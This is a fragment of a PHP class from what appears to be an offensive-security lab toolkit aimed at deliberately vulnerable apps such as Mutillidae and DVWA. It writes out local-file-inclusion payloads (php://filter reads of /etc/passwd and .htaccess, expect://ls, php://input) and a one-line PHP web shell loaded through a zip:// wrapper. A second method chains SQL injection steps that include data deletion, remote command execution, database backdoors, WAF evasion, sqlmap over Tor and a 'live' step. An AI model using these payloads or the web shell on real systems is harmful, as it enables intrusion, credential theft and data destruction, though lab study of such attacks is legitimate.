         $this->net("http://$this->msf/dvwa/.htaccess");
         $this->pause();
         $this->net("http://php.net/manual/fr/wrappers.php");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/resource=/etc/passwd");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/read=string.toupper|string.rot13/resource=/etc/passwd");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/read=string.tolower/resource=/etc/passwd");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/read=string.tolower/resource=/var/www/mutillidae/index.php");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/read=string.tolower/resource=/etc/group");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/read=string.tolower/resource=/var/www/mutillidae/.htaccess");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://filter/read=string.tolower/resource=/var/www/dvwa/.htaccess");
         $this->pause();
         $this->net("http://$this->msf/mutillidae/index.php?page=expect://ls");
         $this->pause();
         $this->article("HackBar","POST <?phpinfo()?>");
         $this->net("http://$this->msf/mutillidae/index.php?page=php://input");
         $this->pause();
         $vmx = new vm($this->msf);
         $this->requette("echo '<?system(\$_REQUEST[cmd])?>' > $this->dir_tmp/shell_php.php ");
         //$this->requette("zip $this->dir_tmp/shell_php.php -d $this->dir_tmp/shell_php.zip ");
         //$vmx->vm2upload("$this->dir_tmp/shell_php.zip", "$this->vm_tmp_lin/shell_php.zip");
         $this->net("http://$this->msf/mutillidae/index.php?page=zip://$this->vm_tmp_lin/shell_php.zip%23shell");
         $this->pause();
         $this->todo("php://filter/write=convert.base64-decode/resource=php://filter/write=convert.base64-decode/resource=php://filter/write=convert.base64-decode/resource=YOUR_PAYLOAD_BASE64_ENCODED_3TIMES");
         $this->pause();
         */
        
        $owasp = "10.60.10.130";
        $this->flag_poc = TRUE ;
        $this->flag_poc = FALSE ;
        $uri = "mutillidae/index.php?target_host=prof.hack.vlan&page=dns-lookup.php&dns-lookup-php-submit-button=Lookup+DNS";
        $url = "http://$owasp:80/$uri";
        
        $ip = "$owasp";
        $eth = $this->ip4eth4target($ip);
        $domain = "hack.vlan";
        $OS = "linux";
        $url_fi = new PARAM($eth,$domain,$url,"target_host","prof.hack.vlan");
        
        $url_fi->poc($this->flag_poc);
        $url_fi->ce2shell8php2wrapper($OS);
    }
    
    

    
    public function poc4web4sqli(){
        $this->gtitre( "SQL Injection" );
        
        $url = "http://localhost/sql1.php?id=1";
        $url_sqli = new sqli("$this->dir_tmp", $url);
        //$url_sqli->sqli_install_labs_sql_injection();$url_sqli->sqli_fichier_sql(); //install -> First Time
        $url_sqli->sqli_intro();
        $url_sqli->sqli_bypass_Auth();
        $url_sqli->sqli_alter_Data();
        $url_sqli->sqli_delete_Data();
        $url_sqli->sqli_dos_sqli($url);
        $url_sqli->sqli_information_Disclosure($url);
        $url_sqli->sqli_undestanding_boolean_based_blind_sqli_mysql($url);
        $url_sqli->sqli_starting_sqlmap();
        $url_sqli->sqli_fingerprint_database($url);
        $url_sqli->sqli_techniques($url); // S Q
        $url_sqli->sqli_password_sqlmap($url);
        $url_sqli->sqli_crackingPassword();
        $url_sqli->sqli_countermeasure_crack();
        $url_sqli->sqli_remote_Command_Execution($url);
        $url_sqli->sqli_backdoor_database($url);
        $url_sqli->sqli_evading_waf(); // evad waf
        $url_sqli->sqli_dorks_sqli();
        $url_sqli->sqli_sqlmap_tor();
        $url_sqli->sqli_live ();
        $url_sqli->sqli_contremeasure();
        $this->notify ( "END SQL Injection" );
    }
    
    
    
}